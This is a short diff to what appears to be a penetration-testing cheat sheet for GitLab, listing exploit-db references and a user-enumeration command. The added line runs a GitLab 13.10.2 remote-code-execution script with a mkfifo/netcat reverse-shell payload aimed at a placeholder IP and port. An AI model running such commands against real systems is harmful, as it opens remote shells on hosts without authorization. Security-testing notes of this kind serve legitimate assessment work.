@@ -1133,6 +1133,7 @@ https://www.exploit-db.com/exploits/49821
 https://github.com/dpgg101/GitLabUserEnum
 $ ./gitlab_userenum.sh --url <URL> --userlist users.txt
 https://www.exploit-db.com/exploits/49951
+$ python3 gitlab_13_10_2_rce.py -t <URL> -u <username> -p <password> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP address> <port> >/tmp/f '
 ```
 
 #4. - Lateral Movement
